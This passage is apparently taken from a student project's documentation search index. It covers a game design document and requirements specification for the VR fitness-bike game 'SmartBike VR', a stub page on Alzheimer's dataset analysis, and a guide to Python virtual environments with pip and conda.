the virtual world. It also offers a unique way for players to interact with the game environment.  Different types of challenges, such as sprints, endurance races, and hill climbs, provide players with varied gameplay experiences that require adjusting their physical engagement strategies.  ","version":"Next","tagName":"h3"},{"title":"2.2. Multiplayer Features​","type":1,"pageTitle":"Game Design Document","url":"/redback-documentation/docs/project-1/vr/game-design#22-multiplayer-features","content":" In &quot;SmartBike VR&quot;, players can join live cycling events, races, or group rides in real-time, where Photon Fusion ensures smooth multiplayer gameplay with minimal latency. This allows participants to experience real-time interactions with other players, simulating the feel of riding alongside each other, whether they're racing head-to-head or engaging in a leisurely group ride. Photon Fusion’s efficient networking is key to providing this seamless multiplayer environment, minimizing lag even with multiple players connected simultaneously.  Player performance is tracked using various metrics, such as time, distance, and calories burned, all of which can be displayed on a real-time leaderboard. This ranking system adds a competitive edge, encouraging players to push themselves harder and improve their results. The system could also highlight personal achievements and improvements over time, motivating users to stay engaged.  In addition to competitive racing, the game offers cooperative challenges. These can include endurance rides, where players team up to cover long distances together, or obstacle courses that require coordinated effort to overcome. Such cooperative activities promote teamwork and foster social interaction among players, creating a sense of camaraderie. Teams can strategize to complete challenges, perhaps with different riders taking on specific roles based on their in-game strengths, making the experience more dynamic and engaging.  By blending competitive elements with cooperative gameplay, the game fosters a community of players who can enjoy both individual challenges and social experiences.  ","version":"Next","tagName":"h3"},{"title":"2.3. Synchronized View​","type":1,"pageTitle":"Game Design Document","url":"/redback-documentation/docs/project-1/vr/game-design#23-synchronized-view","content":" In &quot;SmartBike VR&quot;, both the player in VR and spectators watching on an external monitor can enjoy a highly immersive and engaging experience through synchronized views. While the player navigates the virtual world from a first-person perspective, feeling as if they’re truly riding a bike, the external monitor offers an alternate viewing experience, such as a third-person camera or dynamic angles that showcase the player’s environment and progress from a broader perspective.  On the monitor, a comprehensive HUD (Heads-Up Display) enhances the spectator experience by providing detailed cycling stats. This could include real-time metrics like speed, heart rate, calories burned, and power output, offering viewers insight into the player’s physical exertion. The player’s position in the race or event, along with the overall progress of the ride, can also be displayed, showing lap times, remaining distance, and the positions of other competitors or teammates.  For an added layer of immersion, the camera angle could dynamically shift to highlight key moments in the race. For example, during close competition between players, the camera could zoom in on head-to-head sprints or critical overtaking moments. Alternatively, for longer endurance events, the camera might switch to a bird’s-eye view, giving spectators a clearer view of the terrain, track layout, and rider positions.  This dual view system allows for engaging live streams or in-person events where spectators can cheer on their favorite players, track their progress, and witness the virtual environment in ways that aren’t limited to the player’s VR perspective. By combining the VR experience with detailed stats and race updates on the monitor, you can create a more inclusive and informative environment for both participants and audiences, making the game not only immersive for the player but also compelling for those watching.  ","version":"Next","tagName":"h3"},{"title":"3. Rules​","type":1,"pageTitle":"Game Design Document","url":"/redback-documentation/docs/project-1/vr/game-design#3-rules","content":" 3.1. What is the victory and loss conditions of SmartBike VR?​  Victory Conditions: The primary victory condition in &quot;SmartBike VR&quot; is achieving personal goals and milestones within the game. Players aim to complete races and delivery quests, earning rewards and progressing through the game's content. Success is measured by reaching the finish line first in races or successfully completing delivery objectives. Additionally, players can track their accumulated data and achievements over time, such as distance travelled, calories burned, and quests completed, fostering a sense of accomplishment and improvement in their fitness journey.  Loss Conditions: While &quot;SmartBike VR&quot; is designed to promote a positive and engaging experience, there might not be traditional &quot;loss&quot; conditions in the game. Instead, the focus could be on encouraging players to stay motivated and continually improve their performance. If a player doesn't complete a race or quest successfully, they could have the opportunity to retry without significant penalties. The emphasis is more on progress and personal growth rather than outright failure. This approach aligns with the game's goal of providing an enjoyable and active experience.  ","version":"Next","tagName":"h2"},{"title":"3.2. What are the active challenges of SmartBike VR?​","type":1,"pageTitle":"Game Design Document","url":"/redback-documentation/docs/project-1/vr/game-design#32-what-are-the-active-challenges-of-smartbike-vr","content":" Time Trials: Players compete against their own best times or against friends' times in time trial races. The challenge is to complete the race in the shortest time possible, motivating players to pedal harder and faster.  Endurance Races: Endurance Races in &quot;SmartBike VR&quot; are exhilarating challenges that push players' physical limits and provide a platform for showcasing their dedication to fitness and their mastery of the virtual cycling world. These races are designed to simulate the experience of tackling lengthy cycling routes that require sustained effort and stamina.  The key to conquering endurance races lies in finding a balance between pacing oneself and maintaining a consistent level of effort throughout the race. Players need to gauge their energy reserves, strategically manage their pacing, and effectively utilize their virtual bike's capabilities to navigate terrain changes and potential obstacles. Uphill segments demand increased exertion, testing players' ability to power through resistance, while downhill stretches allow for recovery and speed boosts.  Successfully completing endurance races rewards players not only with in-game rewards such as virtual currency, gear upgrades, or cosmetic enhancements but also with a tangible sense of accomplishment. The recognition of their dedication and the progress they've made in their fitness journey is celebrated through virtual achievements and leaderboards that showcase their achievements to other players.  Sprint Challenges: Sprint Challenges within the captivating realm of &quot;SmartBike VR&quot; introduce exhilarating moments of intense pedal-to-the-metal action, designed not only to deliver bursts of heart-pounding excitement but also to enhance players' cardiovascular fitness in a dynamic and engaging manner. These challenges embody the essence of high-speed competition, demanding rapid and forceful pedalling as players navigate through specially designed virtual tracks that are perfect for unleashing their full cycling potential.  In a Sprint Challenge, the adrenaline rush is palpable as players accelerate their virtual bikes to breakneck speeds, their determination driving them to surpass their previous limits. These challenges encourage players to tap into their energy reserves and unleash explosive bursts of power, providing a workout that not only ignites cardiovascular activity but also intensifies the overall gaming experience.  As players engage in these rapid sprints, they encounter various terrain features that mimic real-world conditions—rolling hills, straightaways, and sharp turns—all meticulously crafted to demand precise control, strategic acceleration, and well-timed deceleration. The short yet intense nature of Sprint Challenges ensures that players maintain an elevated heart rate throughout, promoting endurance and stamina while simulating the intensity of real-world cycling sprints.  Hill Climbs: &quot;Hill Climbs&quot; in the world of &quot;SmartBike VR&quot; encapsulate the essence of conquering challenging terrains and mastering the art of uphill cycling. These virtual segments intricately recreate the arduous yet rewarding experience of climbing hills, pushing players to summon their inner strength and endurance as they navigate these steep inclines. Just like real-life hill climbs, these segments demand increased effort, determination, and strategic pedalling to overcome the resistance and reach the summit.  As players embark on Hill Climbs, they are transported to captivating virtual landscapes featuring gradients that mirror the complexities of real-world terrain. The challenge lies in the symbiotic relationship between the player's physical exertion and the virtual resistance encountered, providing an authentic sensation of cycling uphill. Pedalling harder against this resistance emulates the sensation of battling gravity and conquering the climb, adding a layer of realism to the gameplay.  Each Hill Climb introduces unique features that replicate the variability of outdoor cycling experiences. Some segments might present prolonged steady climbs, allowing players to find a sustainable rhythm, while others could feature alternating inclines and plateaus that require quick adjustments in pedalling intensity.  Delivery Quests with Obstacles: In the bright world of &quot;SmartBike VR,&quot; &quot;Delivery Quests with Obstacles&quot; adds a dynamic layer of gameplay that gives players a thrilling, immersive experience that mixes the adrenaline of time-sensitive tasks with the art of precision. These adventures immerse players in a narrative where they take on the role of a dedicated courier charged with delivering essential supplies across various virtual environments while overcoming a variety of challenges that put their riding prowess and problem-solving abilities to the test.  As they begin these adventures, players face a range of difficulties, including topographical differences, environmental dangers, and strategic decision-making opportunities. As they pedal through crowded cities, peaceful country roads, and difficult off-road terrain, the time passes. In addition to getting there on schedule, the goal is to strike a careful balance between speed and accuracy because rushing could result in accidents and setbacks.  These objectives are completed to add to the overall sense of success that &quot;SmartBike VR&quot; delivers, encouraging an enjoyable gameplay experience that tests players' mental and physical abilities.  Distance Challenges: The &quot;Distance Challenges&quot; in the &quot;SmartBike VR&quot; universe weave an engrossing tapestry of success and drive, inspiring players to set out on thrilling travels where each pedal stroke advances them. In order to feel a feeling of success and to increase their motivation to cover longer distances over time, these challenges provide players the ability to set their sights on achieving distance milestones during a single gameplay session.  Players are met by a variety of virtual settings that reflect the diversity and beauty of the real world as they embark on their bicycle odysseys. Each route offers a distinctive environment for players to immerse themselves in their riding experience, from wide open roads that reach into the distance to twisting routes that wind through gorgeous landscapes. The difficulty lies not only in crossing the distance, but also in keeping a steady rhythm and speed to enhance performance.  The mechanisms of the game painstakingly detect each pedal turn as you travel, converting physical effort into virtual advancement. As they pedal forwards, players can see their distance increase, giving them a visual reflection of their effort.  Beyond in-game wealth or aesthetic upgrades, distance challenge completion awards come in a variety of forms. While these incentives provide participants with concrete credit for their efforts, the main victory is the sense of accomplishment that comes from exceeding their distance objectives.  Calories Burned Goals: The &quot;SmartBike VR&quot; immersive world's &quot;Calories Burned Goals&quot; establish a meaningful link between virtual adventure and actual fitness goals, giving players a concrete and satisfying way to monitor their physical exertion. With the help of these challenges, players may set goals for how many calories they want to burn as they play, turning the act of virtual cycling into a routine workout that fits in well with their efforts to improve their health and wellbeing.  The pursuit of calories burnt turns into a driving force that directs players during games. The game's mechanisms convert players' physical output into calories expended as they pedal through picturesque routes, negotiate difficult terrain, and engage in a variety of virtual activities, enabling them to see the immediate results of their exertion in real time. Players are motivated to persevere by the excitement of seeing their development, which fosters a sense of empowerment and success.  Virtual Competitions: Within the engaging &quot;SmartBike VR&quot; universe, &quot;Virtual Competitions&quot; provide an electric gameplay dimension where people from all over the world come together in real-time races and challenges, developing a sense of community, friendship, and exhilarating competitiveness. Players can use this dynamic platform to demonstrate their abilities, compete amicably, and enjoy the thrill of global connectivity inside the virtual cycling world thanks to these events.  Virtual competitions offer rewards that go beyond the virtual world, such as the camaraderie of competing and interacting with other players as well as in-game achievements. Players are inspired to continuously improve their talents, pushing their physical and virtual performance to new heights, thanks to the immersive excitement of real-time competition and the validation of one's achievements.  Interval Training: The unique gameplay mechanic &quot;Interval Training&quot; introduces in the immersive setting of &quot;SmartBike VR&quot; incorporates dynamic cycling sessions that follow the principles of interval training, a well-known fitness method. With times of extreme effort interspersed with periods of active recuperation, these specialised programmes boost players' cardiovascular fitness and endurance while offering an enjoyable and transforming exercise experience.  Players go between quick sprints and more deliberate pedalling throughout these alternate stages, which are all intended to improve cardiovascular training. The virtual environments of &quot;SmartBike VR&quot; serve as the background for these phases. These sessions can have a range of lengths, from quick but intense intervals to longer cycles, providing flexibility for players with different fitness levels and objectives.  The benefits of interval training sessions go beyond the confines of the game, as participants leave with a greater sense of success as well as an improved cardiovascular capability. The interval strategy offers a dynamic integration of gaming and fitness, enabling players to see &quot;SmartBike VR&quot; as both a committed fitness companion and a source of pleasure.  Progressive Challenges: &quot;Progressive Challenges&quot; in the intriguing world of &quot;SmartBike VR&quot; present a dynamic and gratifying avenue for players to set off on a journey of growth, improvement, and ongoing achievement. These challenges are made to change as players' skill and fitness levels advance, generating a supportive environment and a constant sense of accomplishment throughout the gameplay experience.  Players that participate in Progressive Challenges are involved in a series of tasks that evolve and get harder over time. These tasks are thoughtfully designed to mirror players' developing skills, gradually providing more complicated environments, difficult opponents, and challenging goals. The goal is to engage on a journey of ongoing progress that mirrors athletes' actual journeys towards health, not only to overcome a single challenge.  Players are rewarded for completing each level of the challenge not just with in-game rewards and virtual upgrades but also with the knowledge that they are developing new talents and going beyond their comfort zones. This sense of accomplishment encourages them to continue playing the game and keeping up with their exercise routine, which starts a cycle of personal growth that extends beyond the virtual world.  ","version":"Next","tagName":"h3"},{"title":"3.3. What is the Internal Economy of SmartBike VR?​","type":1,"pageTitle":"Game Design Document","url":"/redback-documentation/docs/project-1/vr/game-design#33-what-is-the-internal-economy-of-smartbike-vr","content":" 3.3.1. What tangible resources does the game use?​  Tangible resources\tWhat value does it have?\tHow is it exchanged in the game?\tNegative feedback mechanism (to avoid rapid growth)\tPositive feedback mechanism (to avoid stalemate)\tRandom elementsVirtual Currency\tA common component of game economies\tPlayers can use this currency to purchase cosmetic upgrades for their virtual bikes, gear, and accessories, enhancing their in-game appearance.\tThe player will get less currency if they take too long to finish a course and if they crash on any object\tPlayers will get extra currency when they finish the course quick and being flawless\tNone Cosmetic Items\tSelf-Expression, Achievement Recognition, Goals and Motivation\tPlayers can purchase cosmetic items using the virtual currency earned by participating in races, quests, and events\tNone\tNone\tNone Quest Rewards\tEnhanced Customization and Progression Incentive\tVirtual Currency, Cosmetic Unlocks and Achievement Recognition\tThe same quest cannot give rewards if it is completed more than 1 time\tProgressive Unlocks: Instead of delivering all rewards at once, the game could provide incremental rewards for completing certain milestones within a quest or race\tNone Leaderboard Bonuses\tFor participating in Virtual Competitions or achieving high rankings in various challenges, players could earn leaderboard bonuses\tvirtual currency or unique customization options.\tThe player will get less rewards for not being high on the leaderboard once a month\tSeasonal Resets, Tiered Rewards, Exclusive Rewards\tNone  3.3.2. What intangible resources does the game use?​  Intangible resources\tWhat value does it have?\tHow is it exchanged in the game?\tNegative feedback mechanism (to avoid rapid growth)\tPositive feedback mechanism (to avoid stalemate)\tRandom elementsExperience and Skill\tPerformance Improvement, Challenge Mastery, Personal Growth\tTime, Practice, Learning from Others\tNone\tSkill-Based Leaderboards: Implement leaderboards that focus on different skill categories, such as fastest completion times or most accurate navigation. This allows players to compete with others who share their skill level.\tNone Strategic Thinking\tCompetitive Advantage: Strategic thinking gives players a competitive advantage by enabling them to plan their moves, anticipate challenges, and make informed decisions during races and challenges.Problem Solving: Strategic thinking allows players to analyse complex situations, identify optimal paths, and find creative solutions to overcome obstacles. Adaptability: The ability to adapt strategies in response to changing conditions\tVaried Terrain: Races and challenges set in diverse terrains require players to employ different strategies.Virtual Competitions: Engaging in Virtual Competitions requires strategic planning to outmanoeuvre opponents. Leaderboard Strategies: Players aiming for top leaderboard positions often need to devise strategic approaches to achieve the fastest completion times, highest accuracy, or other specific criteria.\tNone\tNone\tNone Community and Relationships\tCollaborative Learning, Friendly Competition, Social Interaction\tIn-Game Chat, Virtual Competitions, Leaderboards, Social Features, Forum or Community Hub\tNone\tNone\tNone Sense of Accomplishment\tMotivation, Emotional Reward, Personal Growth, Recognition\tAchievement Unlocks, In-Game Badges, Leaderboard Rankings, Reward Systems\tNone\tNone\tNone Player Identity\tPersonal Connection: Player identity allows individuals to project their personalities, preferences, and uniqueness onto their in-game avatars, creating a deeper personal connection with the virtual world. Self-Expression: The ability to customize avatars, bikes, and appearances enables players to express their creativity and individuality, fostering a sense of ownership and empowerment. Recognition: A distinct player identity, reflected through avatars and cosmetic items, can lead to recognition and social interactions within the game's community.\tBike Customization: Enable players to customize their virtual bikes with different paint jobs, decals, and accessories, allowing for personalization and self-expression. Cosmetic Items: Offer a wide range of cosmetic items, such as clothing, helmets, and bike accessories, that players can exchange virtual currency for to enhance their avatar's appearance. Leaderboards: Displaying avatars alongside leaderboard rankings allows players to associate their identities with their performance and accomplishments.\tNone\tNone\tNone  ","version":"Next","tagName":"h3"},{"title":"4. Appendices​","type":1,"pageTitle":"Game Design Document","url":"/redback-documentation/docs/project-1/vr/game-design#4-appendices","content":" ","version":"Next","tagName":"h2"},{"title":"4.1. Reference Art​","type":1,"pageTitle":"Game Design Document","url":"/redback-documentation/docs/project-1/vr/game-design#41-reference-art","content":" RingFit Adventure has the player actively working out while completing races. It uses a ring that has a physical element to squeeze and pull as well as shift left and right and also a thigh holder so the player can run and the game is controlled by the physical activity of the player    RingFit Adventure, 2019  Down Fast VR is a virtual only cycling game where the player rides down a hill using the VR controllers and steer using virtual handlebars. As it is virtual only, there lacks the fine movement that is able to be portrayed with a physical bike.    Down Fast VR, 2022  VZFit links to bikes via a physical device that is purchased separately and only works in the VZFit application. It allows you to ride around the world using Google maps imagery which is rendered in a three dimensional view.    VZFit, OtterWorldly screenshot, 2022 ","version":"Next","tagName":"h3"},{"title":"ChatBot","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-2/Chat Bot/ChatBot","content":"ChatBot Last updated by: Lachlan, Last updated on: '17/12/2024' Last updated by: Lachlan, Last updated on: '17/12/2024'","keywords":"","version":"Next"},{"title":"Predictive modelling of Alzheimer's Disease","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-2/Data Science and Analytics/AlzheimersProject","content":"","keywords":"","version":"Next"},{"title":"Data Analytics​","type":1,"pageTitle":"Predictive modelling of Alzheimer's Disease","url":"/redback-documentation/docs/project-2/Data Science and Analytics/AlzheimersProject#data-analytics","content":" We make use of Jupyter Notebooks to conduct and display our work with assisstance from following Python libraries:  Data Analytics: Pandas,Numpy Data Visualization: MatplotLibSeaborn Machine learning: scikit-Learn  The dataset in use for classification training at this stage is the Open Access Series of Imaging Studies (OASIS) released on Kaggle by the Washington University Alzheimer's Disease Research center, the Neuroinformatics Research group at Washington University School of medicine, the Biomedical Informatics Research Network and Dr Randy Buckner of the Howard Hughes Medical Institute.1  The Dataset (n=373) consists of the following columns:  Column Name\tDescription\tTypeSubject ID\tUnique identifier for each subject of the study.\tNominal MRI IR\tUnique identifier for each MRI scan.\tNominal Group\tClassification of the subject\tNominal: [Nondemented , Demented , Converted] Visit\tn-th visit of the patient\tDiscrete MR Delay\tTime between the occurence of this scan and the last\tDiscrete M/F\tGender of the subject\tNominal: [M: Male , F: Female] Hand\tDominant hand of the subject\tNominal: [R: Right Handed, L: Left Handed] Age\tAge of the subject at time of visit\tDiscrete: [years: 60 - 96] EDUC\tYears of formal schooling\tDiscrete: [years] SES\tAn index of socioeconomic status2 expanded to 5 factors\tOrdinal: [1: Highest ➡ 5: Lowest] MMSE\tMini Mental State Examination Score3\tOrdinal: [30: Best ➡ 0: Worst] CDR\tClinical Dementia Rating4\tOrdinal: [0: None, 0.5: Very Mild, 1: Mild, 2:Moderate] eTIV\tEstimated total intracranial volume5\tContinuous: [cm^3] ASF\tAtlas Scaling Factor - Automated Normalisation of head size / brain analysis5\tContinuous [unitless] nWBV\tNormalized Whole Brain Volume (percent of voxels in masked image labeled as grey / white matter)6.\tDiscrete: [0%-100%]  ","version":"Next","tagName":"h2"},{"title":"Approach​","type":1,"pageTitle":"Predictive modelling of Alzheimer's Disease","url":"/redback-documentation/docs/project-2/Data Science and Analytics/AlzheimersProject#approach","content":" Please discuss the logic behind your workflow here  info Document Creation: 5 September 2024. Last Edited: 5 September 2024. Authors: Lachlan Costigan    Footnotes​ Open Access Series of Imaging Studies (OASIS): Longitudinal MRI Data in Nondemented and Demented Older Adults. Marcus, DS, Fotenos, AF, Csernansky, JG, Morris, JC, Buckner, RL, 2010. Journal of Cognitive Neuroscience, 22, 2677-2684. doi: 10.1162/jocn.2009.21407 ↩ Hollingshead, A. (1957). Two factor index of social position. New Haven, CT: Yale University Press. ↩ Folstein MF, Folstein SE, McHugh PR. &quot;Mini-mental state&quot;. A practical method for grading the cognitive state of patients for the clinician. J Psychiatr Res. 1975 Nov;12(3):189-98. doi: 10.1016/0022-3956(75)90026-6. PMID: 1202204. ↩ Morris JC. The Clinical Dementia Rating (CDR): current version and scoring rules. Neurology. 1993 Nov;43(11):2412-4. doi: 10.1212/wnl.43.11.2412-a. PMID: 8232972. ↩ Buckner RL, Head D, Parker J, Fotenos AF, Marcus D, Morris JC, Snyder AZ. A unified approach for morphometric and functional data analysis in young, old, and demented adults using automated atlas-based head size normalization: reliability and validation against manual measurement of total intracranial volume. Neuroimage. 2004 Oct;23(2):724-38. doi: 10.1016/j.neuroimage.2004.06.018. PMID: 15488422. ↩ ↩2 Fotenos AF, Snyder AZ, Girton LE, Morris JC, Buckner RL. Normative estimates of cross-sectional and longitudinal brain volume decline in aging and AD. Neurology. 2005 Mar 22;64(6):1032-9. doi: 10.1212/01.WNL.0000154530.72969.11. PMID: 15781822. ↩ ","version":"Next","tagName":"h2"},{"title":"Best Practices for Collaborative Python Development","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-2/Data Science and Analytics/Best_Practices","content":"","keywords":"","version":"Next"},{"title":"Develop in a Virtual Environment​","type":1,"pageTitle":"Best Practices for Collaborative Python Development","url":"/redback-documentation/docs/project-2/Data Science and Analytics/Best_Practices#develop-in-a-virtual-environment","content":" Using a virtual environment in Python is simple and ensures that there won't be any conflicts between a previously installed version of a library and that which you are running. It functionally allows you to pretend that you're running a clean Python3 installation with just the packages you need in that particular instance. Furthermore, It also provides the advantage that you can provide a requirements.txt file, which gives an easy method to share the necessary file versions that work together and solves a great proportion of &quot;It works on my machine issues&quot;  Another consideration I would recommend is the use of pyenv (windows version here). This is a tool that grants you the ability to swap in python versions / interpreters in the same way we might swap around versions of python libraries. If a tool is running on a specific old version of python3 and is broken in new versions, it is worth considering using this to manage it. Especially with the quality of life features provided by being able to to set specific versions to specific folders / projects.  The temptation may exist to download this via PIP (or whatever package manager) but I can't stress what a bootstrapping nightmare it is to have a package manager tied to a python version in charge of a python version manager and so on. do yourself a favour and keep pyenv as the overseer of its python versions. Same is especially true as conda does provide similiar functionality in that you can configure venvs with particular python versions, but again, bootstrapping hell  With that out of the way, let's examine Virtual environments:  ","version":"Next","tagName":"h2"},{"title":"1. PIP​","type":1,"pageTitle":"Best Practices for Collaborative Python Development","url":"/redback-documentation/docs/project-2/Data Science and Analytics/Best_Practices#1-pip","content":" Do you install your packages by running pip install {packagename}? Read this bit  First things first, we want to ensure that python is in your shell's path. to do so simply open a terminal and type: python If this results in output that shows the current python version and and interpreter (denoted by the &gt;&gt;&gt; prompt ) you should be good to go. If not, ask an LLM chatbot to walk you through it with your particular OS / terminal info.  ","version":"Next","tagName":"h2"},{"title":"Creating a venv:​","type":1,"pageTitle":"Best Practices for Collaborative Python Development","url":"/redback-documentation/docs/project-2/Data Science and Analytics/Best_Practices#creating-a-venv","content":" In your terminal navigate to the folder your project (or projects if they're related and going to share packages) is located and type python -m venv .venv  This tells python to use the venv module to create a folder named .venv that contains the python bin info and will be where all of your installed libraries are contained. You can technically name it whatever you like, but in this case its convention, and .venv is already included in the gitignore. Since our collaborators probably wont be using the exact same python binary, we dont want to force them to download personalized junk. What we do want to do, is to provide them with a list of things they need to make our application / jupyter notebook to work like it does on our machine.  ","version":"Next","tagName":"h3"},{"title":"Entering a venv:​","type":1,"pageTitle":"Best Practices for Collaborative Python Development","url":"/redback-documentation/docs/project-2/Data Science and Analytics/Best_Practices#entering-a-venv","content":" If you've just create the venv from above, you can activate it by typing:  UNIX (MAC / Linux) Bash / zsh: source .venv/bin/activatefish: source .venv/bin/activate.fshcsh/tcsh: source .venv/bin/activate.csh Windows: Powershell: .venv\\Scripts\\Activate.ps1cmd (in current year?): .venv\\Scripts\\Activate.bat  You'll know it was a success if in your terminal it shows up with (.venv) before the prompt.  ","version":"Next","tagName":"h3"},{"title":"Logging your packages:​","type":1,"pageTitle":"Best Practices for Collaborative Python Development","url":"/redback-documentation/docs/project-2/Data Science and Analytics/Best_Practices#logging-your-packages","content":" Now download all your packages and when you've got everything your jupyter notebook or python script requires, run pip freeze &gt; requirements.txt This will output all of the packages in this venv and write them to a file named requirements.txt  ","version":"Next","tagName":"h3"},{"title":"Installing someone elses venv​","type":1,"pageTitle":"Best Practices for Collaborative Python Development","url":"/redback-documentation/docs/project-2/Data Science and Analytics/Best_Practices#installing-someone-elses-venv","content":" Then, all anyone needs to do to get a working build of your code on their machine, should be to download the repo, navigate to the project folder, make their own venv and run:pip install -r requirements.txtor failing that:python -m pip install -r requirements.txt  ","version":"Next","tagName":"h3"},{"title":"2. Conda​","type":1,"pageTitle":"Best Practices for Collaborative Python Development","url":"/redback-documentation/docs/project-2/Data Science and Analytics/Best_Practices#2-conda","content":" Do you install your packages by running Conda install {packagename}? or just downloaded Anaconda for a unit ages ago and have everything already? Read this bit  Assuming you ran the anaconda installer with default settings, conda should be on your system's PATH. This can be tested by opening a terminal and running conda.  You should get some version info. if you get a file not found error, ask an LLM chatbot to walk you through it with your particular OS / terminal info.  ","version":"Next","tagName":"h2"},{"title":"Creating a venv:​","type":1,"pageTitle":"Best Practices for Collaborative Python Development","url":"/redback-documentation/docs/project-2/Data Science and Analytics/Best_Practices#creating-a-venv-1","content":" In your terminal navigate to the folder your project (or projects if they're related and going to share packages) is located and type conda create -n .venv  This will create a hidden folder in that directory named .venv that contains the python and conda bin info and will be where all of your installed libraries are contained. You can technically name it whatever you like, but in this case its convention, and .venv is already included in the gitignore.  You can also specify python version by appending the version=x.x as well as initialize the venv with any packages you know you'll want by appending the package names to the end of the command  Since our collaborators probably wont be using the exact same python binary, we dont want to force them to download personalized junk. What we do want to do, is to provide them with a list of things they need to make our application / jupyter notebook to work like it does on our machine.  ","version":"Next","tagName":"h3"},{"title":"Logging your packages:​","type":1,"pageTitle":"Best Practices for Collaborative Python Development","url":"/redback-documentation/docs/project-2/Data Science and Analytics/Best_Practices#logging-your-packages-1","content":" Now download all your packages and when you've got everything your jupyter notebook or python script requires, run conda list -e &gt; requirements.txt This will output all of the packages in this venv and write them to a file named requirements.txt  ","version":"Next","tagName":"h3"},{"title":"Installing someone elses venv​","type":1,"pageTitle":"Best Practices for Collaborative Python Development","url":"/redback-documentation/docs/project-2/Data Science and Analytics/Best_Practices#installing-someone-elses-venv-1","content":" Then, all anyone needs to do to get a working build of your code on their machine, should be to download the repo, navigate to the project folder, make their own venv and run:conda create -n .venv --file requirements.txt  info Document Creation: 5 September 2024. Last Edited: 5 September 2024. Authors: Lachlan Costigan ","version":"Next","tagName":"h3"},{"title":"Software Requirements Specification","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/vr/software-requirements","content":"","keywords":"","version":"Next"},{"title":"1. Introduction​","type":1,"pageTitle":"Software Requirements Specification","url":"/redback-documentation/docs/project-1/vr/software-requirements#1-introduction","content":" The SmartBike VR project aims for gamification exercise at the comfort of one’s home with a prepared built-in bicycle and a VR headset ready for the user to explore around many scenes one cannot otherwise see or experience as someone who might prefer the indoors over the outdoors. It is a combination of VR and IoT mixing virtual reality and hardware added to the physical bike for a fun filled adventure for the sake of exercise to a physically fit body.  The purposes of the project would be for students to work on both VR and IoT aspects of the bike, be it Unity for making gamified exercises through fun missions, design by Blender to create wondrous scenes into the Unity project that people can see real time by a VR headset and working on the bike itself to connect the Unity project to the physical bike so gamified exercise on screen can be felt through the body.  Students interested in Unity, with good understanding of C# coding by various units such as SIT232 can start upskilling and start making wondrous missions and gimmicks for the bike and scenes to motivate users for exercise.  ","version":"Next","tagName":"h2"},{"title":"2. Intended Audience​","type":1,"pageTitle":"Software Requirements Specification","url":"/redback-documentation/docs/project-1/vr/software-requirements#2-intended-audience","content":" The intended audience for SmartBike VR is diverse, catering to a range of demographics and interests. At its core, the game appeals to fitness enthusiasts and cycling fans who are looking for a fun, interactive way to stay active, regardless of weather conditions. The platform provides an alternative for those who may face outdoor challenges, such as older individuals who find it difficult to go outside or those who are unable to exercise due to environmental limitations.  The game also targets people who struggle with motivation, offering an engaging experience through gamified fitness, multiplayer interactions, and real-time progress tracking. Social riders who enjoy community-based fitness can benefit from the cooperative challenges and group rides, while gamers are drawn in by the competitive elements, smooth multiplayer gameplay, and immersive VR experience.  In addition, companies looking for innovative wellness activities can adopt the game to promote employee fitness, teamwork, and social interaction. Tech enthusiasts, drawn by the integration of VR, real-time multiplayer capabilities, and advanced fitness tracking, will also find appeal in the game's cutting-edge features. With a broad target audience ranging from ages 13 and up, the game creates opportunities for players of different backgrounds to participate in a unique and engaging fitness experience.  ","version":"Next","tagName":"h2"},{"title":"3. Intended Use​","type":1,"pageTitle":"Software Requirements Specification","url":"/redback-documentation/docs/project-1/vr/software-requirements#3-intended-use","content":" SmartBike VR is designed with versatility and broad appeal in mind, offering numerous practical applications. One of its primary uses is to promote physical activity, particularly for individuals who may struggle with motivation or face other barriers to regular exercise. Additionally, the game serves as a tool for rehabilitation and therapy, providing patients with a safe and engaging way to regain strength and mobility through guided cycling routines.  Beyond its fitness benefits, the game offers entertainment and leisure for casual users and competitive gaming opportunities for those who enjoy the challenge of head-to-head races or virtual events. Virtual tourism allows players to explore new environments and landscapes, making cycling a visually enriching experience. It also supports training and skill development, allowing users to enhance their cycling performance or technique in a controlled, virtual setting.  To ensure accessibility, the game is designed to function on most VR headsets, making it available to a wide audience. The multiplayer feature enables users to connect and ride with friends, fostering social interaction. Player scores and preferences are tied to accounts, allowing seamless transitions between systems. For those who may find wearing a VR headset for long periods fatiguing, a non-VR mode ensures that the game remains accessible and enjoyable without the need for virtual reality.  ","version":"Next","tagName":"h2"},{"title":"4. Competitors​","type":1,"pageTitle":"Software Requirements Specification","url":"/redback-documentation/docs/project-1/vr/software-requirements#4-competitors","content":" There are several competitors to SmartBike VR, each offering different approaches to virtual cycling, fitness, and gaming experiences. Here’s a list of some key competitors:  Zwift Zwift is one of the most popular virtual cycling platforms, combining video game elements with structured workouts and live races. Riders can cycle through virtual worlds, train, and compete with others globally.Rouvy Rouvy focuses on augmented reality cycling, where real-world routes are overlaid with virtual elements. It provides realistic road simulations, allowing cyclists to experience global routes from home.Bkool Bkool offers a range of virtual cycling experiences, including real-world video simulations and 3D virtual routes. It also features a social aspect with multiplayer races and group rides.Wahoo RGT (Road Grand Tours) Wahoo RGT offers virtual cycling with an emphasis on real-world physics and competitive group riding. It provides structured training plans, simulated races, and group rides with realistic terrains and dynamics.FulGaz FulGaz delivers high-quality, real-world video footage of famous cycling routes. The app adjusts difficulty based on actual terrain and user power, offering a realistic training experience.Peloton (Digital App) While primarily known for its indoor bike and fitness classes, Peloton offers virtual cycling workouts and live classes via their app, focusing on guided workouts, motivation, and community interaction.VZfit VZfit uses the Oculus VR platform to provide immersive cycling experiences. Users can ride through various environments and fitness challenges using VR, offering both exercise and entertainment.Expresso Bike Expresso offers interactive virtual cycling through stationary bikes equipped with screens. Riders can choose different courses and compete against others in live competitions.TrainerRoad TrainerRoad focuses on structured cycling workouts and performance improvement through data-driven training plans, though it lacks the more immersive virtual worlds of other platforms.Kinomap Kinomap uses real-world video routes where users can ride along virtually while cycling on a stationary trainer. It also includes multiplayer challenges, competitions, and real-time performance tracking.  These competitors each offer unique features, from competitive racing environments to guided workouts, making the virtual cycling and fitness space highly dynamic and varied.  ","version":"Next","tagName":"h2"},{"title":"5. Scope​","type":1,"pageTitle":"Software Requirements Specification","url":"/redback-documentation/docs/project-1/vr/software-requirements#5-scope","content":" This trimester we will endeavor to work on the missions in VR Unity project, fixing up a mission board using MissionActivator code left in the previous trimester to store mission code and select on missions for user to play smoothly. New missions have been created, making sure they are gamified as the focus of the SmartBike 